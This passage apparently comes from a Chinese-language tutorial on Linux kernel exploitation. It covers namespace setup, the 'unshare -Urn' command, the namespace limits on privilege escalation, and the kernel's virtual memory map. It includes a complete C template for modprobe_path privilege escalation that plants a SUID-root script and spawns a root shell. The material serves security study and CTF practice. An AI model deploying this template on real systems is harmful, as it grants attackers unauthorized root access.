class="string">&quot;[*] creating network namespace (CLONE_NEWNET)...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNET) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] setting up UID namespace...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置 &quot;deny&quot; 禁止修改组信息</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] denying namespace rights to set user groups...\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> setgroups_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    dprintf(setgroups_fd, <span class="string">&quot;deny&quot;</span>);</span><br><span class="line">    close(setgroups_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入 UID 映射，将旧的 UID 映射到 UID 0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] mapping uid %d to namespace uid 0...\n&quot;</span>, uid);</span><br><span class="line">    <span class="type">int</span> uid_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    dprintf(uid_fd, <span class="string">&quot;0 %d 1\n&quot;</span>, uid);</span><br><span class="line">    close(uid_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入 GID 映射</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] mapping gid %d to namespace gid 0...\n&quot;</span>, gid);</span><br><span class="line">    <span class="type">int</span> gid_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    dprintf(gid_fd, <span class="string">&quot;0 %d 1\n&quot;</span>, gid);</span><br><span class="line">    close(gid_fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="unshare-命令"><a href="#unshare-命令" class="headerlink" title="unshare 命令"></a>unshare 命令</h4><p><code>unshare</code> 是一个用于在 Linux 系统中创建新的命名空间的命令。<code>unshare</code> 命令会创建一个新的命名空间，并将创建的进程移入该命名空间。这样，进程在新的命名空间内执行时，所使用的资源将与其他进程隔离。</p>
<p>在 kernel pwn 中常用如下命令让 <code>exp</code> 进入网络和用户命名空间，并且在命名空间中权限为 root。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshare -Urn ./exp</span><br></pre></td></tr></table></figure></div>

<p>**<code>-U</code>**：创建一个新的 <strong>用户命名空间</strong>。在新的用户命名空间中，进程的 UID 和 GID 是独立的，它们与主机系统的 UID 和 GID 映射是隔离的。</p>
<p>**<code>-r</code><strong>：</strong><code>--map-root-user</code>**，在新的用户命名空间中将当前用户映射为 <strong>root 用户</strong>（UID 0）。</p>
<p>**<code>-n</code>**：创建一个新的 <strong>网络命名空间</strong>。进程将在新的网络栈中运行，这样它将有自己的网络接口、路由表和网络设备，和主机系统或者其他进程的网络配置隔离开来。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p><code>unshare</code> 在创建和让进程进入新的命名空间之外顺便还完成了权限的映射，因此这里不需要再手动进行权限映射。</p>

    </div>
  </div>


<h3 id="命名空间与提权"><a href="#命名空间与提权" class="headerlink" title="命名空间与提权"></a>命名空间与提权</h3><p>处于命名空间中的程序在提权后可能会出现 <code>uid</code> 显示为 0 但是实际权限不是 root 权限的现象。</p>
<p>实际上这与 <code>cred</code> 结构体中除了 <code>uid</code>、<code>gid</code> 等描述权限的字段之外还有 <code>struct user_namespace *user_ns</code> 这样跟命名空间相关的字段，因此：</p>
<ul>
<li>如果我们仅修改了 <code>cred</code> 中的 <code>uid</code>、<code>gid</code> 等字段可能只是在命名空间中完成了“提权”，实际表现并不是 root 权限。</li>
<li>另外像 SUID 文件提权本质上还是修改了 <code>uid</code> 和 <code>gid</code>，同样只是在命名空间中完成“提权”。</li>
</ul>
<p>因此<strong>要想真正提权，关键还是看有没有整体换掉 <code>cred</code> 而不是仅仅修改了其中的 <code>uid</code> 和 <code>gid</code>。</strong></p>
<p>明确了这一点我们可以确定下面几种提权方式在命名空间中可以真正的提权到 root 权限：</p>
<ul>
<li><p>覆盖 <code>task_struct-&gt;cred</code> 指向 <code>init_cred</code>。</p>
</li>
<li><p><code>commit_creds</code> 提权：本质上也是把 <code>task_struct</code> 换成了 <code>init_cred</code></p>
</li>
<li><p><code>modprobe_path</code> 无文件方式：因为是建立管道与 root 权限进程启的 shell 通信，用的是 shell 的 cred，因此是 root 权限。</p>
</li>
</ul>
<p>而对于那些在命名空间中不能真正提权的方法，可以通过 <code>fork</code> 系统调用创建子进程，然后子进程进命名空间完成一部分需要特权的操作。剩余部分以及最后的提权需要在父进程中完成（或者改父进程的 <code>cred</code>)。父子进程直接可以通过共享内存或者 socket 进行通信。</p>
<p>例如下面的基于 <code>modprobe_path</code> 的提权模板，可以以通过 <code>fork</code> 子进程进入命名空间，然后父进程负责获取 root shell。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/io_uring.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_modprobe_path</span><span class="params">(<span class="type">char</span> *modprobe_path, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="built_in">memset</span>(modprobe_path, <span class="number">0</span>, len);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> modprobe_fd = open(<span class="string">&quot;/proc/sys/kernel/modprobe&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (modprobe_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open /proc/sys/kernel/modprobe.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> read_len = read(modprobe_fd, modprobe_path, len);</span><br><span class="line">    <span class="keyword">if</span> (read_len == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to read /proc/sys/kernel/modprobe.&quot;</span>);</span><br><span class="line">        close(modprobe_fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read_len == len) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] /proc/sys/kernel/modprobe may not read completely.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read_len = <span class="built_in">strlen</span>(modprobe_path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read_len &gt; <span class="number">1</span> &amp;&amp; modprobe_path[read_len - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        modprobe_path[--read_len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(modprobe_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> read_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[], <span class="type">char</span> *envp[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="type">int</span> status_fd[<span class="number">2</span>];</span><br><span class="line">        socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, status_fd);</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *program_path = realpath(<span class="string">&quot;/proc/self/exe&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">pid_t</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">uint8_t</span> status;</span><br><span class="line">            read(status_fd[<span class="number">0</span>], &amp;status, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">char</span> modprobe_path[PATH_MAX];</span><br><span class="line">            get_modprobe_path(modprobe_path, <span class="keyword">sizeof</span>(modprobe_path));</span><br><span class="line">            <span class="type">int</span> modprobe_fd = open(modprobe_path, O_WRONLY | O_CREAT | O_TRUNC, <span class="number">0755</span>);</span><br><span class="line">            <span class="keyword">if</span> (modprobe_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to open modprobe path %s.\n&quot;</span>, modprobe_path);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] creating modprobe script file %s.\n&quot;</span>, modprobe_path);</span><br><span class="line">            dprintf(modprobe_fd, <span class="string">&quot;#! /bin/sh\nchown 0:0 %s\nchmod 4555 %s\n&quot;</span>, program_path, program_path);</span><br><span class="line">            close(modprobe_fd);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] creating trigger file /tmp/trigger.&quot;</span>);</span><br><span class="line">            <span class="type">int</span> trigger_fd = open(<span class="string">&quot;/tmp/trigger&quot;</span>, O_WRONLY | O_CREAT | O_TRUNC, <span class="number">0755</span>);</span><br><span class="line">            write(trigger_fd, <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span>, <span class="number">4</span>);</span><br><span class="line">            close(trigger_fd);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] executing trigger file...&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/tmp/trigger&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">char</span> *shell_command;</span><br><span class="line">            asprintf(&amp;shell_command, <span class="string">&quot;%s shell&quot;</span>, program_path);</span><br><span class="line">            system(shell_command);</span><br><span class="line">            <span class="built_in">free</span>(shell_command);</span><br><span class="line">            <span class="built_in">free</span>(program_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">const</span> <span class="type">char</span> *new_argv[] = &#123;</span><br><span class="line">                <span class="string">&quot;/usr/bin/unshare&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-Urn&quot;</span>,</span><br><span class="line">                program_path,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                <span class="literal">NULL</span></span><br><span class="line">            &#125;;</span><br><span class="line">            asprintf(&amp;new_argv[<span class="number">3</span>], <span class="string">&quot;%d&quot;</span>, status_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">            execve(new_argv[<span class="number">0</span>], new_argv, envp);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] fork failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;shell&quot;</span>)) &#123;</span><br><span class="line">        setuid(<span class="number">0</span>);</span><br><span class="line">        setgid(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> modprobe_path[PATH_MAX];</span><br><span class="line">        get_modprobe_path(modprobe_path, <span class="keyword">sizeof</span>(modprobe_path));</span><br><span class="line">        remove(modprobe_path);</span><br><span class="line">        remove(<span class="string">&quot;/tmp/trigger&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;echo \&quot;/sbin/modprobe\&quot; &gt; /proc/sys/kernel/modprobe&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] spawning a root shell...&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> status_fd;</span><br><span class="line">    <span class="built_in">sscanf</span>(argv[<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>, &amp;status_fd);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;sudo sh -c &#x27;echo \&quot;/tmp/my_modprobe\&quot; &gt; /proc/sys/kernel/modprobe&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    write(status_fd, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h1><h2 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h2><p>在 Linux 内核源码中的文档 <code>Documentation/x86/x86_64/mm.rst</code> 中有对 Linux 内核的内存映射的详细描述。</p>
<blockquote>
<p><strong>完整的虚拟内存映射（4 级页表）</strong></p>
<ul>
<li><p>诸如 “-23 TB” 这样的负地址是以字节为单位的绝对地址，计算方式是从 64 位地址空间的顶部开始向下计算。通过绝对地址和距离顶部的表示方式结合来看，内存布局会更容易理解。例如，<code>0xffffe90000000000</code> 就等于 -23 TB，它比 64 位地址空间的顶部（<code>ffffffffffffffff</code>）低 23 TB。请注意，当我们接近地址空间的顶部时，表示法会从 TB 变为 GB，接着变为 MB&#x2F;KB。</p>
</li>
<li><p>“16M TB” 可能一开始看起来很奇怪，但它比 “16 EB” 更容易理解为大小表示，因为 “16 EB” 可能让人难以第一时间意识到是 16 埃克萨字节（Exabyte）。它还很好地展示了 64 位地址空间是多么巨大。</p>
</li>
</ul>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">========================================================================================================================</span><br><span class="line">    Start addr    |   Offset   |     End addr     |  Size   | VM area description</span><br><span class="line">========================================================================================================================</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> 0000000000000000 |    0       | 00007fffffffffff |  128 TB | user-space virtual memory, different per mm</span><br><span class="line">__________________|____________|__________________|_________|___________________________________________________________</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> 0000800000000000 | +128    TB | ffff7fffffffffff | ~16M TB | ... huge, almost 64 bits wide hole of non-canonical</span><br><span class="line">                  |            |                  |         |     virtual memory addresses up to the -128 TB</span><br><span class="line">                  |            |                  |         |     starting offset of kernel mappings.</span><br><span class="line">__________________|____________|__________________|_________|___________________________________________________________</span><br><span class="line">                                                            |</span><br><span class="line">                                                            | Kernel-space virtual memory, shared between all processes:</span><br><span class="line">____________________________________________________________|___________________________________________________________</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> ffff800000000000 | -128    TB | ffff87ffffffffff |    8 TB | ... guard hole, also reserved for hypervisor</span><br><span class="line"> ffff880000000000 | -120    TB | ffff887fffffffff |  0.5 TB | LDT remap for PTI</span><br><span class="line"> ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</span><br><span class="line"> ffffc88000000000 |  -55.5  TB | ffffc8ffffffffff |  0.5 TB | ... unused hole</span><br><span class="line"> ffffc90000000000 |  -55    TB | ffffe8ffffffffff |   32 TB | vmalloc/ioremap space (vmalloc_base)</span><br><span class="line"> ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole</span><br><span class="line"> ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base)</span><br><span class="line"> ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole</span><br><span class="line"> ffffec0000000000 |  -20    TB | fffffbffffffffff |   16 TB | KASAN shadow memory</span><br><span class="line">__________________|____________|__________________|_________|____________________________________________________________</span><br><span class="line">                                                            |</span><br><span class="line">                                                            | Identical layout to the 56-bit one from here on:</span><br><span class="line">____________________________________________________________|____________________________________________________________</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> fffffc0000000000 |   -4    TB | fffffdffffffffff |    2 TB | ... unused hole</span><br><span class="line">                  |            |                  |         | vaddr_end for KASLR</span><br><span class="line"> fffffe0000000000 |   -2    TB | fffffe7fffffffff |  0.5 TB | cpu_entry_area mapping</span><br><span class="line"> fffffe8000000000 |   -1.5  TB | fffffeffffffffff |  0.5 TB | ... unused hole</span><br><span class="line"> ffffff0000000000 |   -1    TB | ffffff7fffffffff |  0.5 TB | %esp fixup stacks</span><br><span class="line"> ffffff8000000000 | -512    GB | ffffffeeffffffff |  444 GB | ... unused hole</span><br><span class="line"> ffffffef00000000 |  -68    GB | fffffffeffffffff |   64 GB | EFI region mapping space</span><br><span class="line"> ffffffff00000000 |   -4    GB | ffffffff7fffffff |    2 GB | ... unused hole</span><br><span class="line"> ffffffff80000000 |   -2    GB | ffffffff9fffffff |  512 MB | kernel text mapping, mapped to physical address 0</span><br><span class="line"> ffffffff80000000 |-2048    MB |                  |         |</span><br><span class="line"> ffffffffa0000000 |-1536    MB | fffffffffeffffff | 1520 MB | module mapping space</span><br><span class="line"> ffffffffff000000 |  -16    MB |                  |         |</span><br><span class="line">    FIXADDR_START | ~-11    MB | ffffffffff5fffff | ~0.5 MB | kernel-internal fixmap range, variable size and offset</span><br><span class="line"> ffffffffff600000 |  -10    MB | ffffffffff600fff |    4 kB | legacy vsyscall ABI</span><br><span class="line"> ffffffffffe00000 |   -2    MB | ffffffffffffffff |    2 MB | ... unused hole</span><br><span class="line">__________________|____________|__________________|_________|___________________________________________________________</span><br></pre></td></tr></table></figure></div>

<p><strong>完整的虚拟内存映射（5 级页表）</strong></p>
<ul>
<li>使用 56 位地址时，用户空间的内存扩展了 512 倍，从 0.125 PB 增加到 64 PB。所有内核映射会向下移动至 -64 PB 起始偏移位置，并且许多内存区域会扩展以支持更大容量的物理内存。</li>
</ul>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">========================================================================================================================</span><br><span class="line">    Start addr    |   Offset   |     End addr     |  Size   | VM area description</span><br><span class="line">========================================================================================================================</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> 0000000000000000 |    0       | 00ffffffffffffff |   64 PB | user-space virtual memory, different per mm</span><br><span class="line">__________________|____________|__________________|_________|___________________________________________________________</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> 0100000000000000 |  +64    PB | feffffffffffffff | ~16K PB | ... huge, still almost 64 bits wide hole of non-canonical</span><br><span class="line">                  |            |                  |         |     virtual memory addresses up to the -64 PB</span><br><span class="line">                  |            |                  |         |     starting offset of kernel mappings.</span><br><span class="line">__________________|____________|__________________|_________|___________________________________________________________</span><br><span class="line">                                                            |</span><br><span class="line">                                                            | Kernel-space virtual memory, shared between all processes:</span><br><span class="line">____________________________________________________________|___________________________________________________________</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> ff00000000000000 |  -64    PB | ff0fffffffffffff |    4 PB | ... guard hole, also reserved for hypervisor</span><br><span class="line"> ff10000000000000 |  -60    PB | ff10ffffffffffff | 0.25 PB | LDT remap for PTI</span><br><span class="line"> ff11000000000000 |  -59.75 PB | ff90ffffffffffff |   32 PB | direct mapping of all physical memory (page_offset_base)</span><br><span class="line"> ff91000000000000 |  -27.75 PB | ff9fffffffffffff | 3.75 PB | ... unused hole</span><br><span class="line"> ffa0000000000000 |  -24    PB | ffd1ffffffffffff | 12.5 PB | vmalloc/ioremap space (vmalloc_base)</span><br><span class="line"> ffd2000000000000 |  -11.5  PB | ffd3ffffffffffff |  0.5 PB | ... unused hole</span><br><span class="line"> ffd4000000000000 |  -11    PB | ffd5ffffffffffff |  0.5 PB | virtual memory map (vmemmap_base)</span><br><span class="line"> ffd6000000000000 |  -10.5  PB | ffdeffffffffffff | 2.25 PB | ... unused hole</span><br><span class="line"> ffdf000000000000 |   -8.25 PB | fffffbffffffffff |   ~8 PB | KASAN shadow memory</span><br><span class="line">__________________|____________|__________________|_________|____________________________________________________________</span><br><span class="line">                                                            |</span><br><span class="line">                                                            | Identical layout to the 47-bit one from here on:</span><br><span class="line">____________________________________________________________|____________________________________________________________</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> fffffc0000000000 |   -4    TB | fffffdffffffffff |    2 TB | ... unused hole</span><br><span class="line">                  |            |                  |         | vaddr_end for KASLR</span><br><span class="line"> fffffe0000000000 |   -2    TB | fffffe7fffffffff |  0.5 TB | cpu_entry_area mapping</span><br><span class="line"> fffffe8000000000 |   -1.5  TB | fffffeffffffffff |  0.5 TB | ... unused hole</span><br><span class="line"> ffffff0000000000 |   -1    TB | ffffff7fffffffff |  0.5 TB | %esp fixup stacks</span><br><span class="line"> ffffff8000000000 | -512    GB | ffffffeeffffffff |  444 GB | ... unused hole</span><br><span class="line"> ffffffef00000000 |  -68    GB | fffffffeffffffff |   64 GB | EFI region mapping space</span><br><span class="line"> ffffffff00000000 |   -4    GB | ffffffff7fffffff |    2 GB | ... unused hole</span><br><span class="line"> ffffffff80000000 |   -2    GB | ffffffff9fffffff |  512 MB | kernel text mapping, mapped to physical address 0</span><br><span class="line"> ffffffff80000000 |-2048    MB |                  |         |</span><br><span class="line"> ffffffffa0000000 |-1536    MB | fffffffffeffffff | 1520 MB | module mapping space</span><br><span class="line"> ffffffffff000000 |  -16    MB |                  |         |</span><br><span class="line">    FIXADDR_START | ~-11    MB | ffffffffff5fffff | ~0.5 MB | kernel-internal fixmap range, variable size and offset</span><br><span class="line"> ffffffffff600000 |  -10    MB | ffffffffff600fff |    4 kB | legacy vsyscall ABI</span><br><span class="line"> ffffffffffe00000 |   -2    MB | ffffffffffffffff |    2 MB | ... unused hole</span><br><span class="line">__________________|____________|__________________|_________|___________________________________________________________</span><br></pre></td></tr></table></figure></div>

<p>架构定义了 64 位虚拟地址。实现可以支持更少的位数。目前支持的虚拟地址有 48 位和 57 位。位 63 到实现的最高有效位会进行符号扩展。这会导致如果将用户空间和内核地址视为无符号数时，它们之间会出现间隙。</p>
<p>直接映射覆盖系统中的所有内存，直到最高内存地址（这意味着在某些情况下，它还可以包括 PCI 内存孔）。</p>
<p>我们将 EFI 运行时服务映射到 <code>efi_pgd</code> PGD 中的一个 64GB 大小的虚拟内存窗口（这个大小是任意的，如果需要，稍后可以增大）。这些映射不属于任何其他内核 PGD，并且仅在 EFI 运行时调用期间可用。</p>
<p>请注意，如果启用了 <code>CONFIG_RANDOMIZE_MEMORY</code>，所有物理内存的直接映射、<code>vmalloc/ioremap</code> 空间和虚拟内存映射都会被随机化。它们的顺序会保持不变，但它们的基址将在启动时被提前偏移。</p>
